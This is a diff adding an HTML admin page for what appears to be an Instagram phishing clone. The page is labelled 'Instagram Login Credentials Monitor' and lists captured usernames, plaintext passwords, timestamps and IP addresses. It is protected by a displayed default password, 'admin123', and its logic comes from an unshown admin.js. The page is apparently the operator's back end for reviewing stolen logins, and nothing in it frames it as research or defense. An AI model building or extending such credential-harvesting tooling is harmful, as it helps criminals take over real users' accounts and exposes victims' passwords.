@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel - Instagram Clone</title>
+    <link rel="stylesheet" href="admin.css">
+</head>
+
+<body>
+    <div class="admin-container">
+        <div class="admin-header">
+            <h1>🔐 Admin Panel</h1>
+            <p>Instagram Login Credentials Monitor</p>
+        </div>
+
+        <div id="loginSection" class="auth-section">
+            <div class="auth-box">
+                <h2>Admin Authentication</h2>
+                <form id="adminLoginForm">
+                    <input type="password" id="adminPassword" placeholder="Enter admin password" required>
+                    <button type="submit">Access Dashboard</button>
+                </form>
+                <p class="hint">Default password: admin123</p>
+            </div>
+        </div>
+
+        <div id="dashboardSection" class="dashboard-section" style="display: none;">
+            <div class="stats-container">
+                <div class="stat-card">
+                    <div class="stat-icon">📊</div>
+                    <div class="stat-info">
+                        <h3 id="totalCount">0</h3>
+                        <p>Total Credentials</p>
+                    </div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon">🕒</div>
+                    <div class="stat-info">
+                        <h3 id="latestTime">-</h3>
+                        <p>Latest Entry</p>
+                    </div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon">🔄</div>
+                    <div class="stat-info">
+                        <button id="refreshBtn" class="refresh-btn">Refresh Data</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="table-container">
+                <h2>Captured Credentials</h2>
+                <div class="table-wrapper">
+                    <table id="credentialsTable">
+                        <thead>
+                            <tr>
+                                <th>#</th>
+                                <th>Username</th>
+                                <th>Password</th>
+                                <th>Timestamp</th>
+                                <th>IP Address</th>
+                            </tr>
+                        </thead>
+                        <tbody id="credentialsBody">
+                            <tr>
+                                <td colspan="5" class="no-data">No credentials captured yet</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <div class="logout-container">
+                <button id="logoutBtn" class="logout-btn">Logout</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="notification" class="notification"></div>
+
+    <script src="admin.js"></script>
+</body>
+
+</html>
